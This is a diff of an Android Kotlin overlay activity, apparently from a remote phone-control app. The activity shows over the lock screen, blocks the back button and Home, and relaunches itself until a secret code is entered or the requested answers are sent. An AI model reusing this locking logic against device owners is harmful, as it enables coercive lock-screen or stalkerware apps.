@@ -1,5 +1,5 @@
 package com.phonecontrol
-
+ 
 import android.app.Activity
 import android.content.Context
 import android.content.Intent
@@ -15,7 +15,7 @@ import android.view.*
 import android.view.animation.DecelerateInterpolator
 import android.widget.*
 import kotlinx.coroutines.*
-
+ 
 /**
  * Универсальный оверлей:
  *  - mode = "plain"   → текст + кнопка ОК  (без блокировки)
@@ -26,7 +26,7 @@ import kotlinx.coroutines.*
  * перезапуск через 400мс с сохранением прогресса, пока пользователь не отправит ответ.
  */
 class OverlayActivity : Activity() {
-
+ 
     // ── UI ────────────────────────────────────────────────────────────────────
     private lateinit var cardView: LinearLayout
     private lateinit var titleView: TextView
@@ -37,7 +37,7 @@ class OverlayActivity : Activity() {
     private lateinit var progressView: TextView
     private lateinit var fileButtonsLayout: LinearLayout
     private lateinit var feedbackBtn: Button
-
+ 
     // ── Состояние ─────────────────────────────────────────────────────────────
     private var mode            = "plain"
     private var replyPrompt     = "✏️ Напиши ответ:"
@@ -47,7 +47,7 @@ class OverlayActivity : Activity() {
     private var originalText    = ""
     private var uploadChatId    = ""
     private var done            = false   // true после успешной отправки
-
+ 
     // code mode
     private var codeSecret         = ""
     private var allowMedia         = false
@@ -55,7 +55,7 @@ class OverlayActivity : Activity() {
     private var codeWaitingConfirm = false
     private var intentionalLeave   = false   // true когда МЫ сами открываем VPN/TG
     private var codeUnlockReceiver: android.content.BroadcastReceiver? = null
-
+ 
     companion object {
         const val ACTION_CODE_UNLOCK = "com.phonecontrol.CODE_UNLOCK"
         const val ACTION_CODE_DENIED = "com.phonecontrol.CODE_DENIED"
@@ -94,14 +94,14 @@ class OverlayActivity : Activity() {
             })
         }
     }
-
+ 
     private val handler = Handler(Looper.getMainLooper())
-
+ 
     // ── Lifecycle ─────────────────────────────────────────────────────────────
-
+ 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-
+ 
         window.setFlags(WindowManager.LayoutParams.FLAG_SECURE,
             WindowManager.LayoutParams.FLAG_SECURE)
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O_MR1) {
@@ -113,17 +113,17 @@ class OverlayActivity : Activity() {
             WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON or
             WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD
         )
-
+ 
         buildUI()
         applyIntent(intent)
         hideSystemUI()
     }
-
+ 
     override fun onNewIntent(intent: Intent?) {
         super.onNewIntent(intent)
         intent?.let { applyIntent(it) }
     }
-
+ 
     override fun onStop() {
         super.onStop()
         if (done) {
@@ -132,7 +132,7 @@ class OverlayActivity : Activity() {
         // Не вызываем finishAndRemoveTask здесь —
         // переоткрытие обрабатывается в onUserLeaveHint
     }
-
+ 
     /**
      * Вызывается ТОЛЬКО при нажатии Home / переключении задач.
      * НЕ вызывается при повороте экрана — поэтому ротация не ломает overlay.
@@ -168,17 +168,17 @@ class OverlayActivity : Activity() {
             // plain — не возвращаем, пользователь может уйти
         }
     }
-
+ 
     override fun onDestroy() {
         handler.removeCallbacksAndMessages(null)
         unregisterCodeReceiver()
         super.onDestroy()
     }
-
+ 
     override fun onBackPressed() {
         // Полностью блокируем — выход только через кнопку ОК
     }
-
+ 
     override fun dispatchTouchEvent(ev: MotionEvent): Boolean {
         // Пока не done — разрешаем касания только внутри cardView
         if (!done) {
@@ -192,7 +192,7 @@ class OverlayActivity : Activity() {
         }
         return super.dispatchTouchEvent(ev)
     }
-
+ 
     private fun hideSystemUI() {
         if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
             window.insetsController?.let {
@@ -211,14 +211,14 @@ class OverlayActivity : Activity() {
             )
         }
     }
-
+ 
     override fun onWindowFocusChanged(hasFocus: Boolean) {
         super.onWindowFocusChanged(hasFocus)
         if (hasFocus) hideSystemUI()
     }
-
+ 
     // ── Intent → State ────────────────────────────────────────────────────────
-
+ 
     private fun applyIntent(i: Intent) {
         originalText     = i.getStringExtra("message") ?: "⚠️ Сообщение"
         mode             = i.getStringExtra("fb_mode") ?: "plain"
@@ -234,38 +234,44 @@ class OverlayActivity : Activity() {
         codeWaitingConfirm = false
         applyMode()
     }
-
+ 
     private fun applyMode() {
         titleView.text = originalText
-
+ 
         when (mode) {
             "plain" -> {
-                subtitleView.visibility = View.GONE
-                inputLayout.visibility  = View.GONE
-                progressView.visibility = View.GONE
+                subtitleView.visibility      = View.GONE
+                inputLayout.visibility       = View.GONE
+                progressView.visibility      = View.GONE
+                fileButtonsLayout.visibility = View.GONE
+                feedbackBtn.visibility       = View.GONE
                 actionBtn.text = "ОК"
                 actionBtn.setOnClickListener { done = true; finishAndRemoveTask() }
             }
             "reply" -> {
-                subtitleView.text       = replyPrompt
-                subtitleView.visibility = View.VISIBLE
-                inputLayout.visibility  = View.VISIBLE
-                progressView.visibility = View.GONE
+                subtitleView.text            = replyPrompt
+                subtitleView.visibility      = View.VISIBLE
+                inputLayout.visibility       = View.VISIBLE
+                progressView.visibility      = View.GONE
+                fileButtonsLayout.visibility = View.GONE
+                feedbackBtn.visibility       = View.GONE
                 inputField.hint = "Введи ответ..."
                 actionBtn.text  = "Отправить"
                 actionBtn.setOnClickListener { submitReply() }
             }
             "survey" -> {
                 if (questions.isEmpty()) { finishAndRemoveTask(); return }
-                inputLayout.visibility = View.VISIBLE
+                inputLayout.visibility       = View.VISIBLE
+                fileButtonsLayout.visibility = View.GONE
+                feedbackBtn.visibility       = View.GONE
                 showQuestion(currentQuestion)
             }
             "code" -> applyCodeMode()
         }
     }
-
+ 
     // ── Code mode ─────────────────────────────────────────────────────────────
-
+ 
     private fun applyCodeMode() {
         subtitleView.text       = "🔒 Для продолжения введи код"
         subtitleView.visibility = View.VISIBLE
@@ -278,12 +284,12 @@ class OverlayActivity : Activity() {
         inputField.setText("")
         actionBtn.text = "Подтвердить"
         actionBtn.setOnClickListener { checkCode() }
-
+ 
         if (allowMedia) {
             fileButtonsLayout.visibility = View.VISIBLE
             setupCodeMediaButtons()
         }
-
+ 
         // Кнопка обратной связи — внизу по центру
         if (allowFeedback) {
             feedbackBtn.visibility = View.VISIBLE
@@ -291,10 +297,10 @@ class OverlayActivity : Activity() {
         } else {
             feedbackBtn.visibility = View.GONE
         }
-
+ 
         registerCodeReceiver()
     }
-
+ 
     /** Экран обратной связи — поверх основного code экрана */
     private fun showFeedbackScreen() {
         // Скрываем основной контент
@@ -304,14 +310,14 @@ class OverlayActivity : Activity() {
         actionBtn.visibility         = View.GONE
         fileButtonsLayout.visibility = View.GONE
         feedbackBtn.visibility       = View.GONE
-
+ 
         // Показываем экран обратной связи внутри cardView
         val feedbackLayout = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             gravity     = android.view.Gravity.CENTER_HORIZONTAL
             tag         = "feedback_screen"
         }
-
+ 
         val titleFb = TextView(this).apply {
             text     = "Нужна помощь?"
             textSize = 22f
@@ -320,7 +326,7 @@ class OverlayActivity : Activity() {
             typeface = android.graphics.Typeface.DEFAULT_BOLD
             setPadding(0, 0, 0, dp(8))
         }
-
+ 
         val subtitleFb = TextView(this).apply {
             text     = "Нужен ли вам VPN для доступа?"
             textSize = 15f
@@ -328,13 +334,13 @@ class OverlayActivity : Activity() {
             gravity  = android.view.Gravity.CENTER
             setPadding(0, 0, 0, dp(20))
         }
-
+ 
         val divFb = View(this).apply {
             setBackgroundColor(0x33FFFFFF)
             layoutParams = LinearLayout.LayoutParams(
                 LinearLayout.LayoutParams.MATCH_PARENT, 1).also { it.bottomMargin = dp(20) }
         }
-
+ 
         val btnYes = Button(this).apply {
             text       = "✅ Да, нужен VPN"
             textSize   = 15f
@@ -344,7 +350,7 @@ class OverlayActivity : Activity() {
             setPadding(dp(20), dp(12), dp(20), dp(12))
             setOnClickListener { showVpnChoice() }
         }
-
+ 
         val btnNo = Button(this).apply {
             text       = "❌ Нет, открыть Telegram"
             textSize   = 15f
@@ -358,7 +364,7 @@ class OverlayActivity : Activity() {
             ).also { it.topMargin = dp(12) }
             setOnClickListener { openTelegram() }
         }
-
+ 
         val btnBack = Button(this).apply {
             text       = "← Назад"
             textSize   = 13f
@@ -368,30 +374,30 @@ class OverlayActivity : Activity() {
             setPadding(0, dp(16), 0, 0)
             setOnClickListener { removeFeedbackScreen(); applyCodeMode() }
         }
-
+ 
         val lp = LinearLayout.LayoutParams(
             LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)
-
+ 
         feedbackLayout.addView(titleFb, lp)
         feedbackLayout.addView(subtitleFb, lp)
         feedbackLayout.addView(divFb)
         feedbackLayout.addView(btnYes, lp)
         feedbackLayout.addView(btnNo)
         feedbackLayout.addView(btnBack, lp.also { it.gravity = android.view.Gravity.CENTER_HORIZONTAL })
-
+ 
         cardView.addView(feedbackLayout, LinearLayout.LayoutParams(
             LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT))
     }
-
+ 
     private fun showVpnChoice() {
         removeFeedbackScreen()
-
+ 
         val choiceLayout = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             gravity     = android.view.Gravity.CENTER_HORIZONTAL
             tag         = "feedback_screen"
         }
-
+ 
         val titleVpn = TextView(this).apply {
             text     = "Выбери VPN"
             textSize = 22f
@@ -400,7 +406,7 @@ class OverlayActivity : Activity() {
             typeface = android.graphics.Typeface.DEFAULT_BOLD
             setPadding(0, 0, 0, dp(8))
         }
-
+ 
         val subtitleVpn = TextView(this).apply {
             text     = "Какое приложение использовать?"
             textSize = 15f
@@ -408,26 +414,26 @@ class OverlayActivity : Activity() {
             gravity  = android.view.Gravity.CENTER
             setPadding(0, 0, 0, dp(20))
         }
-
+ 
         val divVpn = View(this).apply {
             setBackgroundColor(0x33FFFFFF)
             layoutParams = LinearLayout.LayoutParams(
                 LinearLayout.LayoutParams.MATCH_PARENT, 1).also { it.bottomMargin = dp(20) }
         }
-
+ 
         val VPN_APPS = listOf(
             Triple("INCY VPN",  "llc.itdev.incy",        "🔐"),
             Triple("HAPP VPN",  "com.happproxy",          "🛡"),
             Triple("HAPP Pro",  "su.happ.proxyutility",   "🛡"),
         )
-
+ 
         val lp = LinearLayout.LayoutParams(
             LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT)
-
+ 
         choiceLayout.addView(titleVpn, lp)
         choiceLayout.addView(subtitleVpn, lp)
         choiceLayout.addView(divVpn)
-
+ 
         VPN_APPS.forEach { (name, pkg, icon) ->
             val btn = Button(this).apply {
                 text       = "$icon $name"
@@ -444,7 +450,7 @@ class OverlayActivity : Activity() {
             }
             choiceLayout.addView(btn)
         }
-
+ 
         val btnBack = Button(this).apply {
             text       = "← Назад"
             textSize   = 13f
@@ -455,28 +461,28 @@ class OverlayActivity : Activity() {
             setOnClickListener { removeFeedbackScreen(); showFeedbackScreen() }
         }
         choiceLayout.addView(btnBack, lp.also { it.gravity = android.view.Gravity.CENTER_HORIZONTAL })
-
+ 
         titleView.visibility         = View.GONE
         subtitleView.visibility      = View.GONE
         inputLayout.visibility       = View.GONE
         actionBtn.visibility         = View.GONE
         fileButtonsLayout.visibility = View.GONE
         feedbackBtn.visibility       = View.GONE
-
+ 
         cardView.addView(choiceLayout, LinearLayout.LayoutParams(
             LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT))
     }
-
+ 
     private fun launchVpn(pkg: String) {
         val pm = packageManager
-
+ 
         val isInstalled = try {
             pm.getPackageInfo(pkg, android.content.pm.PackageManager.MATCH_UNINSTALLED_PACKAGES)
             true
         } catch (e: android.content.pm.PackageManager.NameNotFoundException) {
             false
         }
-
+ 
         if (allowFeedback) {
             AppWatcher.start(
                 context       = applicationContext,
@@ -488,10 +494,10 @@ class OverlayActivity : Activity() {
             )
         }
         removeFeedbackScreen()
-
+ 
         if (isInstalled) {
             intentionalLeave = true
-
+ 
             // Ищем launcher activity напрямую через queryIntentActivities
             // и запускаем явно по ComponentName — без chooser, без FLAG_ACTIVITY_NEW_TASK конфликтов
             val launcherIntent = Intent(Intent.ACTION_MAIN).addCategory(Intent.CATEGORY_LAUNCHER).apply {
@@ -514,7 +520,7 @@ class OverlayActivity : Activity() {
                     android.util.Log.e("OverlayActivity", "ComponentName launch failed: ${e.message}")
                 }
             }
-
+ 
             // Fallback: getLaunchIntentForPackage
             val launchIntent = pm.getLaunchIntentForPackage(pkg)
             if (launchIntent != null) {
@@ -527,7 +533,7 @@ class OverlayActivity : Activity() {
                     android.util.Log.e("OverlayActivity", "getLaunchIntent failed: ${e.message}")
                 }
             }
-
+ 
             android.util.Log.e("OverlayActivity", "Cannot launch $pkg — not found via any strategy")
         } else {
             // VPN не установлен — Play Market, AppWatcher вернёт в code lock
@@ -544,7 +550,7 @@ class OverlayActivity : Activity() {
             }
         }
     }
-
+ 
     private fun openTelegram() {
         if (allowFeedback) {
             AppWatcher.start(
@@ -570,7 +576,7 @@ class OverlayActivity : Activity() {
             })
         }
     }
-
+ 
     private fun removeFeedbackScreen() {
         val fb = cardView.findViewWithTag<LinearLayout>("feedback_screen")
         fb?.let { cardView.removeView(it) }
@@ -580,9 +586,13 @@ class OverlayActivity : Activity() {
         subtitleView.visibility = View.VISIBLE
         inputLayout.visibility  = View.VISIBLE
     }
-
+ 
     private fun checkCode() {
         val input = inputField.text.toString().trim()
+        if (codeSecret.isEmpty()) {
+            subtitleView.text = "❌ Ошибка: код не задан"
+            return
+        }
         if (input == codeSecret) {
             done = true
             AppWatcher.stop()
@@ -598,7 +608,7 @@ class OverlayActivity : Activity() {
             subtitleView.text = "❌ Неверный код, попробуй ещё"
         }
     }
-
+ 
     private fun setupCodeMediaButtons() {
         fileButtonsLayout.removeAllViews()
         val btnCamera = Button(this).apply {
@@ -639,7 +649,7 @@ class OverlayActivity : Activity() {
         fileButtonsLayout.addView(btnGallery, LinearLayout.LayoutParams(
             0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f))
     }
-
+ 
     private fun registerCodeReceiver() {
         if (codeUnlockReceiver != null) return
         codeUnlockReceiver = object : android.content.BroadcastReceiver() {
@@ -674,12 +684,12 @@ class OverlayActivity : Activity() {
             registerReceiver(codeUnlockReceiver, filter)
         }
     }
-
+ 
     private fun unregisterCodeReceiver() {
         codeUnlockReceiver?.let { try { unregisterReceiver(it) } catch (_: Exception) {} }
         codeUnlockReceiver = null
     }
-
+ 
     private fun showDone(msg: String) {
         titleView.text               = msg
         subtitleView.visibility      = View.GONE
@@ -691,12 +701,12 @@ class OverlayActivity : Activity() {
         actionBtn.text               = "ОК"
         actionBtn.setOnClickListener { done = true; finishAndRemoveTask() }
     }
-
+ 
     private fun fileButtonBg() = GradientDrawable(
         GradientDrawable.Orientation.LEFT_RIGHT,
         intArrayOf(0xFF1A1A2E.toInt(), 0xFF0F3460.toInt())
     ).apply { cornerRadius = dp(12).toFloat(); setStroke(dp(1), 0x44FFFFFF) }
-
+ 
     private fun showQuestion(idx: Int) {
         if (idx >= questions.size) {
             submitSurvey()
@@ -707,12 +717,12 @@ class OverlayActivity : Activity() {
         subtitleView.visibility = View.VISIBLE
         inputField.setText("")
         inputField.hint = "Введи ответ..."
-
+ 
         val isLast = idx == questions.size - 1
         actionBtn.text = if (isLast) "Готово ✓" else "Далее →"
         progressView.text       = "${idx + 1} / ${questions.size}"
         progressView.visibility = View.VISIBLE
-
+ 
         actionBtn.setOnClickListener {
             val ans = inputField.text.toString().trim()
             if (ans.length < 3) {
@@ -724,9 +734,9 @@ class OverlayActivity : Activity() {
             showQuestion(idx + 1)
         }
     }
-
+ 
     // ── Submit ────────────────────────────────────────────────────────────────
-
+ 
     private fun submitReply() {
         val answer = inputField.text.toString().trim()
         if (answer.length < 3) {
@@ -739,7 +749,7 @@ class OverlayActivity : Activity() {
         }
         showDone("✅ Ответ отправлен!")
     }
-
+ 
     private fun submitSurvey() {
         done = true
         val sb = StringBuilder("📋 *Ответы на опросник:*\n\n")
@@ -752,11 +762,11 @@ class OverlayActivity : Activity() {
         }
         showDone("✅ Ответы отправлены!")
     }
-
+ 
     // ── Survey ───────────────────────────────────────────────────────────────
-
+ 
     // ── UI Builder ────────────────────────────────────────────────────────────
-
+ 
     private fun buildUI() {
         val root = android.widget.FrameLayout(this).apply {
             background = GradientDrawable(
@@ -764,7 +774,7 @@ class OverlayActivity : Activity() {
                 intArrayOf(0xCC000000.toInt(), 0xEE0A0A1A.toInt())
             )
         }
-
+ 
         cardView = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             gravity     = android.view.Gravity.CENTER_HORIZONTAL
@@ -772,7 +782,7 @@ class OverlayActivity : Activity() {
             elevation   = dp(16f).toFloat()
             setPadding(dp(28), dp(32), dp(28), dp(28))
         }
-
+ 
         titleView = TextView(this).apply {
             textSize      = 26f
             setTextColor(Color.WHITE)
@@ -781,7 +791,7 @@ class OverlayActivity : Activity() {
             letterSpacing = 0.02f
             setPadding(0, 0, 0, dp(8))
         }
-
+ 
         subtitleView = TextView(this).apply {
             textSize    = 15f
             setTextColor(0xFFCCCCCC.toInt())
@@ -789,7 +799,7 @@ class OverlayActivity : Activity() {
             setPadding(0, 0, 0, dp(16))
             visibility  = View.GONE
         }
-
+ 
         progressView = TextView(this).apply {
             textSize    = 13f
             setTextColor(0xFF8888AA.toInt())
@@ -797,7 +807,7 @@ class OverlayActivity : Activity() {
             setPadding(0, 0, 0, dp(8))
             visibility  = View.GONE
         }
-
+ 
         inputLayout = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
             visibility  = View.GONE
@@ -815,7 +825,7 @@ class OverlayActivity : Activity() {
         }
         inputLayout.addView(inputField, LinearLayout.LayoutParams(
             LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT))
-
+ 
         actionBtn = Button(this).apply {
             textSize      = 16f
             setTextColor(Color.WHITE)
@@ -826,17 +836,17 @@ class OverlayActivity : Activity() {
             typeface      = Typeface.DEFAULT_BOLD
             stateListAnimator = null
         }
-
+ 
         val divider = View(this).apply {
             setBackgroundColor(0x33FFFFFF)
             layoutParams = LinearLayout.LayoutParams(
                 LinearLayout.LayoutParams.MATCH_PARENT, 1).also { it.bottomMargin = dp(20) }
         }
-
+ 
         fun lp() = LinearLayout.LayoutParams(
             LinearLayout.LayoutParams.MATCH_PARENT,
             LinearLayout.LayoutParams.WRAP_CONTENT).also { it.bottomMargin = 0 }
-
+ 
         // Кнопки файлов (камера / галерея) — показываются после отправки ответа
         fileButtonsLayout = LinearLayout(this).apply {
             orientation = LinearLayout.HORIZONTAL
@@ -877,7 +887,7 @@ class OverlayActivity : Activity() {
             .also { it.marginEnd = dp(8) }
         fileButtonsLayout.addView(btnCamera, halfLp)
         fileButtonsLayout.addView(btnGallery, LinearLayout.LayoutParams(0, LinearLayout.LayoutParams.WRAP_CONTENT, 1f))
-
+ 
         // Кнопка обратной связи — внизу по центру
         feedbackBtn = Button(this).apply {
             text      = "💬 Обратная связь"
@@ -888,7 +898,7 @@ class OverlayActivity : Activity() {
             visibility = View.GONE
             setPadding(0, dp(12), 0, 0)
         }
-
+ 
         cardView.addView(titleView,         lp())
         cardView.addView(subtitleView,      lp())
         cardView.addView(progressView,      lp())
@@ -900,15 +910,15 @@ class OverlayActivity : Activity() {
             LinearLayout.LayoutParams.WRAP_CONTENT,
             LinearLayout.LayoutParams.WRAP_CONTENT
         ).also { it.gravity = android.view.Gravity.CENTER_HORIZONTAL; it.topMargin = dp(4) })
-
+ 
         val cardParams = android.widget.FrameLayout.LayoutParams(
             (resources.displayMetrics.widthPixels * 0.88).toInt(),
             android.widget.FrameLayout.LayoutParams.WRAP_CONTENT
         ).also { it.gravity = android.view.Gravity.CENTER }
-
+ 
         root.addView(cardView, cardParams)
         setContentView(root)
-
+ 
         // Анимация появления
         cardView.alpha        = 0f
         cardView.translationY = dp(40).toFloat()
@@ -918,7 +928,7 @@ class OverlayActivity : Activity() {
             .setInterpolator(DecelerateInterpolator(2f))
             .start()
     }
-
+ 
     private fun cardBackground() = GradientDrawable(
         GradientDrawable.Orientation.TL_BR,
         intArrayOf(0xFF1A1A2E.toInt(), 0xFF16213E.toInt(), 0xFF0F3460.toInt())
@@ -926,18 +936,18 @@ class OverlayActivity : Activity() {
         cornerRadius = dp(20).toFloat()
         setStroke(dp(1), 0x33FFFFFF)
     }
-
+ 
     private fun inputBackground() = GradientDrawable().apply {
         setColor(0xFF0D1117.toInt())
         cornerRadius = dp(12).toFloat()
         setStroke(dp(1), 0x446666AA)
     }
-
+ 
     private fun buttonBackground() = GradientDrawable(
         GradientDrawable.Orientation.LEFT_RIGHT,
         intArrayOf(0xFF4F46E5.toInt(), 0xFF7C3AED.toInt())
     ).apply { cornerRadius = dp(14).toFloat() }
-
+ 
     private fun dp(value: Float) =
         TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, value, resources.displayMetrics).toInt()
     private fun dp(value: Int) = dp(value.toFloat())
